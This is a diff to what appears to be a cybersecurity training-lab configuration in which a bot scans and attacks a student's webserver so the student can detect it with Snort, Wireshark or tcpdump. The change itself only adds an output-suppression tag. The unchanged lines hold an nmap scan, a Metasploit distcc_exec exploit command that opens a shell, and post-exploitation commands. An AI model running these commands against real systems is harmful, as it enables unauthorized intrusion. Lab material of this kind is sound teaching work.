@@ -178,6 +178,7 @@ I'm about to attack your system, use Snort to detect the method of attack.
 		<pre_shell>nmap <%= $web_server_ip %> > /dev/null; echo $? </pre_shell>
 		<get_shell>false</get_shell>
 		<post_command></post_command>
+    <suppress_command_output_feedback />
 
 		<prompt>Your webserver is about to be scanned/attacked. Make sure you are using Snort to monitor your network...</prompt>
 
@@ -207,6 +208,7 @@ I'm about to attack your system, use Snort to detect the method of attack.
 	<attack>
 		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; exploit"</get_shell>
 		<post_command>whoami >> out;id >> out;touch hackerbotwashere; echo $?</post_command>
+    <suppress_command_output_feedback />
 
 		<prompt>Your webserver is about to be scanned/attacked. Make sure you are using Snort and Wireshark to monitor your network... This make take a while (a few minutes) please be patient.</prompt>
 
@@ -263,6 +265,7 @@ I'm about to attack your system, use Snort to detect the method of attack.
 	<attack>
 		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; exploit"</get_shell>
 		<post_command>whoami > /dev/null; echo "<%= $flags.pop %>" > /dev/null; echo 'Find the flag! (in the network traffic)'</post_command>
+    <suppress_command_output_feedback />
 
 		<prompt>Your webserver is about to be scanned/attacked. Use Tcpdump and/or Wireshark to view the behaviour of the attacker. There is a flag to be found over the wire. </prompt>
 
